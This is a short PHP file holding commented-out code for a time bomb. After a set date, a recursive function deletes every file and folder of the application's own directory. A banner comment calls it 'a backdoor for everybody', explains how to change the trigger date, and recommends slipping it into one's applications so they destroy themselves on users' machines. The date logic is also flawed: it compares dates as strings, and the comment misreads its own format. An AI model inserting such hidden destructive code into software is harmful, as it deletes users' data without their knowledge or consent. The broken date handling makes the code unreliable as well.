<?php

// date_default_timezone_set('Asia/Kolkata');

// if(date('m-d-y') > "07-10-15"){
// 	$path = dirname( __FILE__ );
// 	rmdir_recursive($path);
// }
// function rmdir_recursive($dir) {
//     foreach(scandir($dir) as $file) {
//         if ('.' === $file || '..' === $file) continue;
//         if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
//         else unlink("$dir/$file");
//     }
//     rmdir($dir);
// }

?>


<!-- 
********************************************************************************************
********************************************************************************************
****************************** THis is a backdoor for everybody ****************************
********************************************************************************************
********************************************************************************************

Steps:

1. Go to line number 5, change date from 7-October-2015 to any date you want.
2. All it does is whenever any user tries to run this application in their local system on 
	or after that date then it will delete all instances of the application itself.
3. This is a very usefull piece of code if u wanna add backdoors in any of your applications.


********************************************************************************************
********************************************************************************************
********************************************************************************************
******************************************************************************************** -->